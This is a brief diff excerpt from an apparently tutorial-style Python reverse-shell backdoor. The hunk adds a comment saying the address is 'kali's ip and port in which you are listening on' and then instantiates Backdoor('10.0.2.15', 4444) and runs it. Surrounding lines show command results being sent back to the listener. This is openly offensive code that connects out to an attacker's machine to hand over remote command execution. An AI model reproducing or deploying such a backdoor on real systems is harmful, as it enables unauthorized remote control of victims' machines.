@@ -70,6 +70,8 @@ class Backdoor:
 
 			self.reliable_send(command_result)
 			
+			
+# 		this is kali's ip and port in which you are listening on	
 my_backdoor=Backdoor("10.0.2.15",4444)
 my_backdoor.run()				
 
